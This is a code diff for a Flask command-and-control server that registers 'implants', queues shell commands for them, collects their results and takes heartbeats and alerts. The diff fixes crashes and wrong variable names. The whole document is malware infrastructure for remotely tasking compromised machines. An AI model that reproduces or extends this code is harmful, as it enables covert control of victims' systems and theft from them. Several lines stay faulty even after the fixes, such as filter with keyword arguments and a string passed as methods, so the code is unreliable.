@@ -4,7 +4,7 @@ from datetime import datetime
 
 
 from flask import (
-    Blueprint, flash, g, redirect, render_template, request, session, url_for
+    Blueprint, flash, g, redirect, render_template, request, session, url_for, jsonify
 )
 from sqlalchemy.exc import IntegrityError
 from werkzeug.security import check_password_hash, generate_password_hash
@@ -64,14 +64,14 @@ def register():
                         db.session.commit()
                         print("Implant added")
                 except:
-                    continue
+                    pass
             else:
                 print("Alert: somone is trying to play with us")
             
             flash(error)
     except:
         print("error")
-        continue
+        pass
     
 
 @bp.route('/getNextCommand', methods=('POST'))
@@ -81,7 +81,7 @@ def get_next_command():
             impl_id = request.json["implant_id"]
 
             if impl_id:
-                commands = Command.query.filter(implant_id=imp_id,status="not_taken_by_implant")
+                commands = Command.query.filter(implant_id=impl_id,status="not_taken_by_implant")
                 if commands:
                     first_value = commands.first()
                     command = first_value.command_text
@@ -95,7 +95,7 @@ def get_next_command():
                 else:
                     return jsonify({"command_id": -1 ,"command": "No command"})
         except:
-            continue
+            pass
 
 
 @bp.route('/sendCommandResult', methods=('POST'))
@@ -107,17 +107,17 @@ def store_command_results():
             result = request.json["result"]
 
             if impl_id:
-                commands = Command.query.filter(implant_id=imp_id,status="taken_by_implant",
+                commands = Command.query.filter(implant_id=impl_id,status="taken_by_implant",
                                                 command_id=cmd_id)
                 if commands:
                     commands.command_result = result
-                    command.status = "completed"
+                    commands.status = "completed"
                     db.session.commit()
                     return jsonify({"status": "Result posted"})
                 else:
                     return jsonify({"status": "Error in posting result"})
         except:
-            continue
+            pass
 
 @bp.route('/hearbeat', methods=('POST'))
 def heartbeat():
@@ -133,7 +133,7 @@ def heartbeat():
             except:
                 return jsonify({"status" : "register first"})
         except:
-            continue
+            pass
 
 @bp.route('/alert', methods=('POST'))
 def alert():
@@ -149,7 +149,7 @@ def alert():
             except:
                 return jsonify({"status":"Bad alert"})
         except:
-           continue  
+           pass  
 
 
 
